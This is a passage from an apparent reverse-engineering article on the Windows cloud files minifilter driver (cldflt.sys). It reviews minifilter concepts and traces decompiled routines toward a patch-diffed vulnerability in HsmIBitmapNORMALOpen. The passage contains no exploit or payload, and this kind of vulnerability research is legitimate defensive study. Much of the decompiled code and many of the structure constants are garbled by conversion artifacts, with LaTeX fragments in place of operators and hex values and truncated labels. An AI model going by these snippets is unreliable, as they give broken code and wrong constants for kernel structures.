the cache attribute that is used to create // the mapping. (MdlAddress\_1->MdlFlags & MDL\_MAPPED\_VA\_NONPAGED\_POOL) $\\begin{array} { r l } { \\mathbf { \\Phi } = } & { { } \\odot } \\end{array}$ ) ? (MappedSystemVa $=$ MmMapLockedPagesSpecifyCache( MdlAddress\_1, 0, MmCached, 0LL, 0, MdlMappingNoExecute\_NormalPriority),

# HsmiFileCacheIrpWrite:

▪ Invokes the same FltAllocateCallbackData function mentioned above.

▪ If the write operation is synchronous, it calls FltPerformSynchronousIo, which initiates a synchronous I/O operation. If the write operation is asynchronous, it calls FltPerformAsynchronousIo which initiates an asynchronous I/O operation.

status\_ret $=$ FltAllocateCallbackData( struct\_03->pflt\_instance, struct\_03->pfile\_object, &RetNewCallbackData);

HsmDbgBreakOnStatus(status\_ret);

if...

RetNewCallbackData->Iopb->MajorFunction $=$ IRP\_MJ\_WRITE;

RetNewCallbackData->Iopb->MinorFunction $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;

RetNewCallbackData->Iopb->Parameters.Write.ByteOffset $=$ ByteOffset;

RetNewCallbackData->Iopb->Parameters.Write.Length $=$ Length;

RetNewCallbackData->Iopb->Parameters.Write.MdlAddress $=$ irp->MdlAddress;

RetNewCallbackData->Iopb->Parameters.Write.Key $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;

RetNewCallbackData->Iopb->Parameters.Write.WriteBuffer $=$ irp->UserBuffer;

if ( (struct\_03->pfile\_object->Flags & FO\_WRITE\_THROUGH) ! $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ) RetNewCallbackData->Iopb->OperationFlags $\| =$ 4u;

Iopb $=$ RetNewCallbackData->Iopb;

if ( IsOperationSynchronous\_1 )

{ Iopb->IrpFlags \| $=$ IRP\_SYNCHRONOUS\_PAGING\_IO\_NO\_CACHE; FltPerformSynchronousIo(RetNewCallbackData); RetNewCallbackData->Iopb->Parameters.Write.MdlAddress $=$ 0LL; status\_ret $=$ RetNewCallbackData->IoStatus.Status; HsmDbgBreakOnStatus(status\_ret); Information\_low $=$ LODWORD(RetNewCallbackData->IoStatus.Information); Information $=$ RetNewCallbackData->IoStatus.Information; if... goto LABEL\_78;

}

Iopb->IrpFlags \| $=$ IRP\_NOCACHE\_PAGING\_IO;

irp->Tail.Overlay.CurrentStackLocation->Control \| $=$ SL\_PENDING\_RETURNED;

status $=$ FltPerformAsynchronousIo( RetNewCallbackData, HsmiFileCacheWriteCompletion, irp)

# HsmiFileCacheIrpQueryInformation:

▪ This routine only validates the request and retrieves data information.

HsmiFileCacheIrpClose: Free resources and complete the request.

It is a good point to pause our analysis and review mini-filter drivers’ concepts.

# 12\. Minifilter drivers review

In this section I am reviewing essential concepts about minifilter drivers, which can provide readers with necessary foundation and a better understanding of the subject.

As mentioned previously in past articles, minifilter drivers have been used for different purposes associated with security, compression, backup, and encryption products, and they are managed by the Filter Manager (FltMgr.sys). Minifilter drivers register themselves with FltMgr.sys for I/O operations, and the filter manager indirectly attaches such filters to the file system stack in a determined order that depends on the minifilters altitude (a value that determines its position in the minifilter stack). In general, minifilter drivers intercept communication between applications and the file system, and they are able to monitor, change or filter file any I/O operations such as reading, writing, directory management, opening file, closing file, retrieving information, and they have also been used for malicious purposes by rootkits.

In the first two articles of this series (ERS\_01 and ERS\_02), we have reviewed concepts about kernel drivers, which use IOCTLs (I/O control codes) to perform multiple device operations. There is an equivalent feature in minifilter drivers that are FSCTL (File System Control Codes) that can be used for retrieving information about a file system, directory, or a single file, as well as change eventual behavior of the file system. These FSCLTs are used by functions such as FltFsControlFile and ZwFsControlFile, which we usually stumbled while reversing code.

Readers will find many similarities between kernel drivers and minifilter drivers but also differences such as creation of control device objects, which represent the minifilter driver, and filter device objects that are responsible for performing the real work. An important aspect of minifilter drivers is that they can filter and work with IRP I/O operations, Fast I/O operations, and callback operations, where they can also register and use preoperation and/or postoperation callback routines for each I/O operation that they are interested in filtering. Any minifilter drivers can be loaded using Windows services API and framework as well as using commands like fltmc load. As an important fact, preoperation and postoperation callback routines are stored in the FLT\_OPERATION\_REGISTRATION structure, which is present in each I/O operation type managed by the minifilter driver.

Once readers start a reverse engineering section of minifilter drivers, you will find the same DriverEntry routine from kernel drivers, and particular functions such as FltRegisterFilter (and that’s the reason about you have seen the FLT\_REGISTRATION structure in previous sections), which is used to register callback routines. Moreover, FsStartFiltering, which is responsible for notifying FltMgr.sys that the minifilter is ready and available to attach to volumes (the availability of a volume is notified by the FltMgr.sys through a call to the InstanceSetupCallback routine) and start the filtering of selected I/O operations. As expected, all callback routines such as InstanceSetupCallback, FilterUnloadCallback and other ones are registered within the FLT\_REGISTRATION structure. The real effect of minifilter driver registering preoperation callbacks with the FiltMgr.sys is that for determined I/O operations only minifilter drivers are triggered, and other ones that didn’t register anything are not involved.

Once I/O operations are processed, a minifilter driver can forward IRP to the next lower driver in the stack and return FLT\_PREOP\_SUCCESS\_NO\_CALLBACK, which instructs the filter manager to not execute a minifilter driver’s postoperation routine during I/O completion, or return FLT\_PREOP\_SUCCESS\_WITH\_CALLBACK, which makes FltMgr.sys to call its postoperation routine during

[https://exploitreversing.com](https://exploitreversing.com/)

I/O completion (note: postoperation routines are called in reversed order, from the minifilter driver with the lowest altitude to the highest one, during I/O completion). As a side note, postoperation callbacks are similar to old completion routines that were used by legacy file system filter drivers, and at the ending of a postoperation routine the mini-filter driver can call FltCompletePendedPostOperation from a work routine that has finished the I/O operation that was pending from the postoperation callback routine. There are other possibilities that are intermediary in this situation like a minifilter driver can, in its preoperation callback routine, queue an operation to a worker thread by invoking FltQueueDeferredIoWorkItem function, and such minifilter driver will return FLT\_PREOP\_PENDING, which shows that the actual I/O operation is still pending. Although it is not a crucial point in this text, as readers have seen it in the reversed code from previous sections, minifilter drivers can use FltCbdqInitialize function within

InstanceSetupCallback routine and FltCbdqInsertIo function in preoperation callback routines to manage the queue of pending I/O operations that have not been processed yet. Following the same line, you can see functions like FltQueueDeferredIoWorkItem when a minifilter driver queues the completion processing of a given operation to a worker thread, and later the minifilter driver will call

FltCompletePendedPostOperation from the worker thread to resume the processing and complete the pending I/O operation.

Likely one of most fundamental concepts is that minifilter drivers are able to associate contexts (instances, volumes, files and so on) to objects aiming to preserve state across I/O operations. A context, which is a structure defined by developers to mini-filter drivers, can be allocated from paged or non-paged pool, even though volume contexts must be allocated from non-paged pool. The mini-filter driver must register the desired type of contexts using FltRegisterFilter function and then it can create a context of any of the registered types by calling FltAllocateContext function.

Context is not the only structure holding important data, and ECPs (Extra Create Parameters) are another kind of structure that can hold information for file creating operation (IRP\_MJ\_CREATE) through an ECP\_LIST structure, which can be system defined, or user defined. The correct configuration and attach of EPCs are accomplished by steps that involve allocating memory (FltAllocateExtraCreateParameterList), allocating memory pool (FltAllocateExtraCreateParameter), inserting ECP context structures into the ECP\_LIST structure (FltInsertExtraCreateParameter), initializing the IO\_DRIVER\_CREATE\_CONTEXT structure (IoInitializeDriverCreateContext), defining the IO\_DRIVER\_CONTEXT structure (the ExtraCreateParameter member of IO\_DRIVER\_CREATE\_CONTEXT structure is pointed to the ECP\_LIST structure and finally attaching the ECPs to the IRP\_MJ\_CREATE operation (FltCreateFileEx2 or IoCreateFileEx). The general picture is that ECPs are used to attach additional information to the IRP\_MJ\_CREATE operation on a file, and other minifilter drivers on the stack can check for this extra information.

Another key concept is the possibility of communication between user-mode application and mini-filter drivers through communication ports, which can be created by the mini-filter driver through FltCreateCommunicationPort function, and then the user-mode application will invoke FilterConnectionCommunicationPort function to connect to this port, which will cause the ConnectNotifyCallback callback from the mini-filter driver to be called by FltMgr.sys.

According to concepts explained so far, the DriverEntry routine of a mini-filter driver is composed of a series of variable initializations, a call of FltRegisterFilter (to register the mini-filter driver) and a call to FltStartFiltering (to start the filtering process). Optionally, the mini-filter driver can register a FilterUnloadCallback routine, which will be called when the service is stopped through the sc stop

[https://exploitreversing.com](https://exploitreversing.com/)

command or via ControlService function. The FilterUnloadCallback routine call FltUnregisterFilter, and it triggers the execution of InstanceTeardownStartCallback and InstanceTeardownCompleteCallback routines. Eventually, it might call CleanupContext callback routine if the mini-filter driver has registered this routine. After the context has been created, the minifilter driver can attach it to an object by calling functions such as FltSetFileContext, FltSetInstanceContext, FltSetVolumeContext and other ones, which clearly depends on the type of context. Regardless of the context created, its lifetime is managed by FltMgr.sys through a control that uses reference counting.

As in kernel drivers, data transfer between user-mode application and the system devices is a common and key operation, and the same methods for access data buffers are also available here as Buffered I/O (there is an allocation of a system buffer), Direct I/O (a memory descriptor list -- MDL -- is created to map the locked buffer) and Neither I/O (I/O manager doesn’t care of memory for buffer, and the management of the buffers is handed over to the mini-filter driver and developer, at last instance), but I will not review details here and I invite you to read on this topic in ERS\_01 and ERS\_02 articles. Some operations can be either IRP-based or Fast I/O based (IRP\_MJ\_DEVICE\_CONTROL, IRP\_MJ\_WRITE, IRP\_MJ\_READ and IRP\_MJ\_QUERY\_INFORMATION), and in case to be Fast I/O, neither buffers method is used. Additionally, while there are IRP-based operations that follow the Flag member of the DEVICE\_OBJECT structure to determine what is the method for accessing data buffer will be used, other ones will always use either Buffer I/O or Neither I/O. However, there are a few operations such as IRP\_MJ\_CREATE\_MAILSLOT, IRP\_MJ\_CREATE\_NAMED\_PIPE and IRP\_MJ\_LOCK\_CONTROL that do not have buffers and, consequently, no buffering methods.

Certainly, one of terms that readers will see in this article are reparsing points, which are file system objects that extend attributes of a file system, and that are composed of user-defined data and reparse point tag that identifies the file system filter driver that owns a specific reparse point. As we will be handling with files in the cloud service (cloud files), another concept that we will work on is file placeholders, which merely represent the actual content of a file or directory (in dehydrated state) that is stored in another place (cloud, in this case), and when such file is really demanded (read), it is retrieved (rehydrated). A placeholder, which is a reparse point, usually contains metadata, but can also contains a small part of the real data.

# 13\. Reversing \| part 03 \| WIN10 22H2

Once we have reversed relevant routines being called from HsmDriverEntry routine, it is time to focus our attention on preoperation and postoperation callbacks, which have been registered by FLT\_OPERATION\_REGISTRATION structure and also have been reported on Figure 62, but I would like to provide you with a list of them before proceeding:

# Preoperation callbacks:

▪ HsmFltPreACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION

▪ HsmFltPreCLEANUP

▪ HsmFltPreCREATE

▪ HsmFltPreDIRECTORY\_CONTROL

▪ HsmFltPreFAST\_IO\_CHECK\_IF\_POSSIBLE

# [https://exploitreversing.com](https://exploitreversing.com/)

▪ HsmFltPreFILE\_SYSTEM\_CONTROL

▪ HsmFltPreLOCK\_CONTROL

▪ HsmFltPreMDL\_READ

▪ HsmFltPreNETWORK\_QUERY\_OPEN

▪ HsmFltPrePREPARE\_MDL\_WRITE

▪ HsmFltPreQUERY\_OPEN

▪ HsmFltPreREAD

▪ HsmFltPreSET\_INFORMATION

▪ HsmFltPreWRITE

# Postoperation callbacks:

▪ HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION

▪ HsmFltPostCLEANUP

▪ HsmFltPostDIRECTORY\_CONTROL

▪ HsmFltPostFILE\_SYSTEM\_CONTROL

▪ HsmFltPostLOCK\_CONTROL

▪ HsmFltPostNETWORK\_QUERY\_OPEN

▪ HsmFltPostQUERY\_INFORMATION

▪ HsmFltPostQUERY\_OPEN

▪ HsmFltPostSET\_INFORMATION

Although it has been mentioned previously, a few context types are registered (check Figure 63), but we will not use at this time:

▪ HsmFltDeleteINSTANCE\_CONTEXT ▪ HsmFltDeleteFILE\_CONTEXT ▪ HsmFltDeleteSTREAM\_CONTEXT ▪ HsmFltDeleteSTREAMHANDLE\_CONTEXT

Returning to preoperation and postoperation callbacks, we should investigate all of them if we are searching for potential vulnerabilities in this minifilter driver. However, as we are researching an existing and specific vulnerability highlighted via patch-diffing, we already know that the sequence up to the fault routine is the following one (confirm it by referring to Figures 15, 16 and 17) :

▪ HsmFltPostQUERY\_OPEN (or HsmFltPostNETWORK\_QUERY\_OPEN)

▪ HsmiFltPostECPCREATE

HsmpSetupContexts HsmpCtxCreateStreamContext.

▪ HsmIBitmapNORMALOpen

We also know that there is a minimum set of routines that we need to analyze as well as multiple other ones being called from them. The list of routines being called throughout the path is actually substantially longer than the presented above, and as reader will realize, different new data types are coming up soon. To help readers, a brief list of routines involved directly or indirectly with the vulnerability follows:

HsmFltPostQUERY\_OPEN (or HsmFltPostNETWORK\_QUERY\_OPEN)

HsmiFltPostECPCREATE

FltGetInstanceContext

FltRemoveOpenReparseEntry

FltObjectDereference

HsmiCreateEnsureDirectoryFullyPopulated

HsmpSetupContexts

FltGetRequestorProcess

# [https://exploitreversing.com](https://exploitreversing.com/)

− HsmOsIsPassThroughModeEnabled

IoGetTransactionParameterBlock FltQueryInformationFile

▪ FltGetStreamContext

▪ HsmpRpReadBuffer

HsmiCldGetSyncRootFileIdByFileObject

▪ HsmpCtxCreateStreamContext HsmiCtxGetOrCreateFileContext

▪ FltAllocateContext

▪ memset

▪ ExInitializeRundownProtection

▪ KeInitializeEvent

▪ FltInitializePushLock

▪ HsmpRpValidateBuffer

▪ ExAllocateFromPagedLookasideList

▪ FltInitializePushLock HsmpBitmapOpen

▪ HsmIBitmapNORMALOpen

Our task in this section is to analyze some of these important routines up to the final one (HsmIBitmapNORMALOpen), which contains vulnerability that we are looking for.

From this point onward, we should remember about a few structures that we declared previously, at the beginning of this article. Honestly, I would not like to repeat such structures, enumerations, and definitions, but eventually forcing readers to search back-and-forth would be a waste of energy. Furthermore, I have made slight changes, added (and created) other ones that will also be useful for readers:

typedef struct \_REPARSE\_DATA\_BUFFER\_EX { ULONG Flags; ULONG ExistingReparseTag; GUID $\\mathsf { E x }$ istingReparseGuid; ULONGLONG Reserved; REPARSE\_DATA\_BUFFER ReparseDataBuffer;

} REPARSE\_DATA\_BUFFER\_EX, \*PREPARSE\_DATA\_BUFFER\_EX;

typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { \_HSM\_REPARSE\_DATA DataBuffer\[\]; } GenericReparseBuffer; } REPARSE\_DATA\_BUFFER, \*PREPARSE\_DATA\_BUFFER;

typedef struct \_HSM\_REPARSE\_DATA { USHORT Flags; USHORT Length; \_HSM\_DATA FileData;

} HSM\_REPARSE\_DATA, \*PHSM\_REPARSE\_DATA;

typedef struct \_HSM\_DATA { ULONG Magic; ULONG Crc32;

ULONG Length; USHORT Flags; USHORT NumberOfElements; \_HSM\_ELEMENT\_INFO ElementInfos\[\]; }; typedef struct \_HSM\_ELEMENT\_INFO { USHORT Type; USHORT Length; ULONG Offset; } HSM\_ELEMENT\_INFO, \*PHSM\_ELEMENT\_INFO; typedef enum \_HSM\_CONSTANTS { HSM\_BITMAP\_MAGIC = $\\Theta \\times 7 \\Theta 5 2 7 4 4 2$ , HSM\_BITMAP\_ELEMENTS = $\\Theta \\times \\Theta 5$ , HSM\_FILE\_MAGIC = $\\Theta \\times 7 \\Theta 5 2 6 5 4 6$ , HSM\_FILE\_ELEMENTS = $\\Theta \\times \\Theta 9$ , HSM\_DATA\_HAVE\_CRC = $\\Theta \\times \\Theta 2$ , HSM\_XXX\_DATA\_SIZE = $\\Theta \\times \\bot \\Theta$ , HSM\_ELEMENT\_TYPE\_NONE = $\\Theta \\times \\Theta \\Theta$ , HSM\_ELEMENT\_TYPE\_UINT64 = $\\Theta \\times \\Theta 6$ , HSM\_ELEMENT\_TYPE\_BYTE = $\\Theta \\times \\Theta 7$ , HSM\_ELEMENT\_TYPE\_UINT32 = $\\Theta \\times \\Theta \\mathsf { A }$ , HSM\_ELEMENT\_TYPE\_BITMAP = $\\Theta \\times \\bot 1$ , HSM\_ELEMENT\_TYPE\_MAX = $\\Theta \\times 1 2$ } HSM\_CONSTANTS;

There are considerations that can be made here and that also reflect the challenge of reversing large code as a minifilter driver:

I have provided the main structures related used by reparse points above, and it does not mean that other ones do not exist. Some structure definitions such as \_REPARSE\_DATA\_BUFFER and \_REPARSE\_DATA\_BUFFER\_EX are public and provided by Microsoft. On the other hand, there are multiple structures and types that are not, including those allocated as pools, and search engines and mainly on projects hosted on GitHub are our resource.

▪ In \_HSM\_DATA structure, I have changed HSM\_ELEMENT\_INFO ElementInfo\[1\] to HSM\_ELEMENT\_INFO ElementInfo\[ \]. Why? Because the example provided by author was limited to one element while in our case there are multiple elements.

▪ I have created an enumeration named \_HSM\_CONSTANTS to make easier to work with these definitions instead of managing them.

Readers have also the option to load PDB files into the analysis (File \| Load File \| PDB File...), mark Types only checkbox, and use available projects that use these structures (compile the Debug version of program because a pdb file is created and can be used on IDA Pro or any other reversing tool) or even any PDB file made available by Microsoft. This last approach requires that readers use an appropriate Windows system (for example, Win10 22H2 in our case ), download the respective symbols (pdb files) and load them into IDA Pro database.

From the HsmFltPostQUERY\_OPEN to HsmIBitmapNORMALOpen routines there are an endless number of functions and subroutines being invoked, and it is quite impossible to analyze and show their codes here. However, readers should pay attention to pools that are allocated and their respective tags, error constants (they may help you to understand what is happening) and renaming arguments from APIs according to official documentation to improve the code markup, which gives meaningful names to variables, arguments and even structures. At the same way, applying enumerations and changing types of variables also make the code a bit easier to understand.

▪ There are many routines starting with Hsm prefix, which contains dozens or even hundreds of lines of code. Although you wouldn’t need to analyze all of them, certainly a quick overview can be useful in certain situations.

▪ The mentioned routines and functions between HsmFltPostQUERY\_OPEN to HsmIBitmapNORMALOpen are not the only necessary one to understand the cldflt.sys minifilter driver.

▪ Throughout the code, we will stumble with handling minifilter contexts, which are structures such as files, instances, streams and other ones, all of them defined in the mini-filter driver. As consequence, contexts are allocated privately by developers and can hold anything and, as they are composed of handles or pointers, they are normally associated with already allocated objects.

▪ Extending the previous paragraph, you will see a data type that is a structure named \_FLT\_RELATED\_CONTEXTS and it has the following members and types:

typedef struct \_FLT\_RELATED\_CONTEXTS {

PFLT\_CONTEXT VolumeContext;

PFLT\_CONTEXT InstanceContext;

PFLT\_CONTEXT FileContext;

PFLT\_CONTEXT StreamContext;

PFLT\_CONTEXT StreamHandleContext;

PFLT\_CONTEXT TransactionContext;

} FLT\_RELATED\_CONTEXTS, \*PFLT\_RELATED\_CONTEXTS;

▪ There is an extended version named \_FLT\_RELATED\_CONTEXTS\_EX, which includes the SectionContext member too. Regardless of such structures, they show that context (or contexts) can be related to distinguished objects such as volume, instance, stream, file, and other ones.

Starting at the HsmFltPostQUERY\_OPEN routine, we have the following representation:

\_\_int64 \_\_fastcall HsmFltPostQUERY\_OPEN( struct \_FLT\_CALLBACK\_DATA \*ptr\_FltCallbackData, PCFLT\_RELATED\_OBJECTS FltObjects, PVOID CompletionContext, FLT\_POST\_OPERATION\_FLAGS Flags)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] ret\_ECPCREATE $=$ HsmiFltPostECPCREATE( ptr\_FltCallbackData, FltObjects, CompletionContext, Flags); if ( !ret\_ECPCREATE && ptr\_FltCallbackData->IoStatus.Status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { Iopb $=$ ptr\_FltCallbackData->Iopb; if ( ((Iopb->Parameters.QueryOpen.FileInformationClass - FileStatInformation) &

0xFFFFFFFD) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { FileInformation $=$ Iopb->Parameters.QueryOpen.FileInformation; if ( (FileInformation->ReparseTag & $\\Theta \\times$ FFFF0FFF) $= =$ dword\_1C0023590 ) { flag $=$ (FileInformation->FileAttributes &

(FILE\_ATTRIBUTE\_RECALL\_ON\_DATA\_ACCESS\|FILE\_ATTRIBUTE\_OFFLINE)) $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ; PlaceholderCompatMode $=$ HsmOsGetPlaceholderCompatMode(ptr\_FltCallbackData); if ( HsmOsDisguisePlaceholder(PlaceholderCompatMode, flag) ) { FileAttributes $=$ FileInformation->FileAttributes & $\\Theta \\times$ FFFFE9FF; if ( !FileAttributes ) FileAttributes $=$ FILE\_READ\_ATTRIBUTES; FileInformation->FileAttributes $=$ FileAttributes; FileInformation->ReparseTag $& =$ ret\_ECPCREATE; } } } } return ret\_ECPCREATE;

The HsmiFltPostECPCREATE routine, which will be the next one to be analyzed, is called too early at the beginning of the code, and even though entire routine could be useful, I am leaving only a few comments here. Postoperation callback routines are defined by the following prototype:

typedef FLT\_POSTOP\_CALLBACK\_STATUS (\*PFLT\_POST\_OPERATION\_CALLBACK) (

IN OUT PFLT\_CALLBACK\_DATA Data, IN PCFLT\_RELATED\_OBJECTS FltObjects, IN PVOID CompletionContext, IN FLT\_POST\_OPERATION\_FLAGS Flags );

As expected, I have applied this prototype to the HsmFltPostQUERY\_OPEN routine. We see the CompletionContext argument, which comes from preoperation and postoperation callbacks, and it is an optional context pointer that can be passed between them (from preoperation to postoperation callbacks).

From this point, I have adjusted the union offered by FLT\_PARAMETERS structure as well as applied data types such as FILE\_INFORMATION\_CLASS and FILE\_STAT\_INFORMATION, which were used to FileInformationClass and FileInformation fields, respectively. Additionally, enumerations such as \_FILE\_INFORMATION\_CLASS and \_FILE\_ATTRIBUTES were also used. However, care must be taken when using existing enumerations provided by IDA Pro or even Microsoft Learn, and the suggestion is that readers consult files like wdm.h and winnt.h (search them from C:\\Program Files (x86)\\Windows Kits\\10 directory and include subdirectories) because they may change over time. Once you have done it, add them to IDA Pro. A suitable information for readers is \_FILE\_ATTRIBUTES structure is bitwise type, and you must consider it while adding it.

Two interesting file structures such as FILE\_ATTRIBUTE\_OFFLINE and

FILE\_ATTRIBUTE\_RECALL\_ON\_DATA\_ACCESS file attributes have came up during the reversing process. The former attribute indicates that the data file is not available immediately, and that it might have been moved to another storage. The latter one indicates that the specific file or directory is not fully present in local storage. Both values are a direct reference to placeholders (that we explained previously in this article) and completely related to the subject of this text. At this point, I will not show the analysis of HsmOsGetPlaceholderCompatMode routine, which aims to manage program compatibility situations, because it is not strictly important to our objective. The general purpose of this routine is to manage conditions about how these placeholders are presented to applications such as a normal placeholder and a masked one (hide the fact that the file is actually a placeholder) as well as describe whether it sets the compatibility mode to the entire process or only a given thread.

We should remember that in the cldflt.sys minifilter context, a placeholder (created by Sync engines -- the sync root, which is a directory used as anchor and monitoring point for synchronization, is registered through CfRegisterSyncRoot function ) is implemented as a reparse point (IO\_REPARSE\_TAG\_CLOUD tag), which are used to handle I/O requests and, in special case of cloud files, any application that attempts to read a dehydrated placeholder file will start a sequence of tasks to restore the associated file content (file rehydration operation), which is one of the reasons that you have seen a reference to FILE\_ATTRIBUTE\_RECALL\_ON\_DATA\_ACCESS file attribute in the previous paragraph. Furthermore, we already know that a file can be in placeholder state, full file state (hydrated explicitly and can be rehydrated again according to convenience) and pinned full file state (hydrated explicitly)

The next routine to be analyzed is HsmFltPostQUERY\_OPEN routine, which I will omit some parts because it is extensive. However, to the next routines, I will leave only necessary code that guides us to other subroutines of interest because there are many topics to be explained ahead, and it would be a waste of space to include too much unnecessary code here. As readers will notice, the code execution only proceeds if it is confident that it is managing with a cloud placeholder (IO\_REPARSE\_TAG\_CLOUD) and also a reparse point (OPEN\_REPARSE\_POINT\_TAG\_ENCOUNTERED). Another point to pay attention to is the fact that the loop interacts with sixteen objects (at this point can be contexts, streams, volumes... it does not matter). It is also relevant to mention that code tests STATUS\_REPARSE, which is a complicated status to interpret. This status actually means that something like the system (or minifilter driver) has already processed the assigned reparse point (it has been hydrated or had its metadata setup, for example) and it will not be necessary to process it again. In other words, the file already has a reparse point associated with. Check these references:

[https://learn.microsoft.com/en-us/samples/microsoft/windows-driver-samples/simrep-file-systemminifilter-driver/](https://learn.microsoft.com/en-us/samples/microsoft/windows-driver-samples/simrep-file-systemminifilter-driver/)). [https://fsfilters.blogspot.com/2012/02/problems-with-statusreparse-part-i.html](https://fsfilters.blogspot.com/2012/02/problems-with-statusreparse-part-i.html) ▪ [https://fsfilters.blogspot.com/2012/02/problems-with-statusreparse-part-ii.html](https://fsfilters.blogspot.com/2012/02/problems-with-statusreparse-part-ii.html)

[https://exploitreversing.com](https://exploitreversing.com/)

If it is a reparse point, but has not been processed yet, it continues the execution, which finally reaches HsmpSetupContexts routine:

int64 fastcall HsmiFltPostECPCREATE( struct \_FLT\_CALLBACK\_DATA \*Data, PCFLT\_RELATED\_OBJECTS FltObjects, \_FLT\_RELATED\_OBJECTS \*CompletionContext, FLT\_POST\_OPERATION\_FLAGS Flags)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] HsmpTracePostCallbackEnter( Data, FltObjects\_01, ( _OPEN\_REPARSE\_LIST\_ENTRY $\\star$ )CompletionContext, 0); FltGetInstanceContext(Instance, (PFLT\_CONTEXT $\\star$ )&Context); if ( !Context ) goto LABEL\_13; if ( Context->flag $= =$ '2IsH' ) { } flag\_02 $=$ OPEN\_REPARSE\_POINT\_TAG\_ENCOUNTERED; Status $=$ Buffer->IoStatus.Status; HsmDbgBreakOnStatus(Status); if ( Status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { while ( 1 ) { $\\mathsf { f l a g \_ } = \\mathsf { \\Omega } \\odot$ ; for ( counter $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; counter $\\angle$ $\\Theta \\times \\bot \\Theta$ ; $^ { + + }$ counter ) { if ( (\*(&CompletionContext_ $\\mathrm { . 0 2 \\mathrm { - } } \\mathrm { > }$ rple\_01.Flags $^ +$ 12 $\\star$ counter) &

OPEN\_REPARSE\_POINT\_TAG\_ENCOUNTERED) ! $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ) { reparse\_tag $=$ (counter << 12) \| IO\_REPARSE\_TAG\_CLOUD; break; } } if ( Buffer->IoStatus.Status ! $=$ STATUS\_REPARSE ) { if ( FileObject->FsContext ) { flag $=$ OPEN\_REPARSE\_POINT\_TAG\_ENCOUNTERED; if ( reparse\_tag ) { HsmpTracePostCallbackEnter( Buffer, (PCFLT\_RELATED\_OBJECTS)CompletionContext\_02, 0LL, OPEN\_REPARSE\_POINT\_TAG\_ENCOUNTERED); Status $=$ HsmpSetupContexts( (RETURNED\_CONTEXT $\\star$ )Context, Buffer->Iopb->TargetFileObject, reparse\_tag, Buffer);

{ Status $=$ STATUS\_REPARSE\_POINT\_NOT\_RESOLVED; HsmDbgBreakOnStatus(STATUS\_REPARSE\_POINT\_NOT\_RESOLVED); if... goto LABEL\_33;

}

Status $=$ HsmiCreateEnsureDirectoryFullyPopulated( (unsigned \_\_int16 $\\star$ )Context, Buffer, $\\textsf { f l a g \_ 0 3 } = \\lambda$ , Buffer->TagData->UnparsedNameLength, &flag\_05, &flag\_06);

The next routine is HsmpCtxCreateStreamContext and similarly I am showing only a piece of relevant code, which I will do some comments:

\_int64 \_\_fastcall HsmpSetupContexts( RETURNED\_CONTEXT \*Context, PFILE\_OBJECT FileObject, int reparse\_tag, struct \_FLT\_CALLBACK\_DATA \*CallbackData)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] if ( !reparse\_tag ) { FileInformation $=$ 0LL; StreamContext $=$ FltQueryInformationFile( Instance, FileObject, &FileInformation, 8u, FileAttributeTagInformation, 0LL); HsmDbgBreakOnStatus(StreamContext); if... if ( (FileInformation.FileAttributes & FILE\_ATTRIBUTE\_REPARSE\_POINT) != 0 ) reparse\_tag $=$ FileInformation.ReparseTag; } if... if ( !IoGetTransactionParameterBlock(FileObject) ) { if ( !CallbackData ) goto LABEL\_42; Iopb $=$ CallbackData->Iopb; FileInformation $=$ 0LL;

memset(&Event, 0, sizeof(Event));

$\\vee 7 2 \\left\[ \\odot \\right\] ~ = ~ \\odot$ ;

StreamContext $=$ FltQueryInformationFile( Iopb->TargetInstance, Iopb->TargetFileObject, &Event, $\\Theta \\times 1 8 \\cup$ , FileStandardInformation, v72);

ABEL\_42: StreamContext $=$ FltGetStreamContext( Instance, FileObject, (PFLT\_CONTEXT $\\star$ )&Context\_01); HsmDbgBreakOnStatus(StreamContext); if ( StreamContext $= =$ (unsigned int)STATUS\_NOT\_FOUND ) { StreamContext $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; } else if... if ( Context\_01 ) { if ( !HsmpIsPlaceholder((\_\_int64)Context\_01) ) goto LABEL\_247; goto LABEL\_122; } $\\star ( \_ { \\sf N O R D } \\star ) { & \\lor } 7 3 = 0 { \ L }$ ; StreamContext $=$ HsmpRpReadBuffer(Instance, FileObject, &pool\_memory); HsmDbgBreakOnStatus(StreamContext); if ( StreamContext $= =$ (unsigned int)STATUS\_NOT\_A\_REPARSE\_POINT \|\| StreamContext $= =$ (unsigned int)STATUS\_VOLUME\_NOT\_UPGRADED \|\| StreamContext $= =$ (unsigned int)STATUS\_BUFFER\_OVERFLOW \|\| StreamContext $= =$ (unsigned int)STATUS\_INVALID\_DEVICE\_REQUEST ) { StreamContext $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; goto LABEL\_231; } if... if ( (pool\_memory->ReparseTag & $\\Theta \\times$ FFFF0FFF) ! $=$ dword\_1C0023590 ) {

LABEL\_231: if ( pool\_memory ) ExFreePoolWithTag(pool\_memory, 'pRsH'); goto LABEL\_247; } LOWORD(v72\[0\]) $=$ pool\_memory->ReparseDataLength; SyncRootFile $=$ HsmiCldGetSyncRootFileIdByFileObject( (\_\_int64)Context, FileObject, (\_\_int64 \*)&v73, 0LL, 0LL);

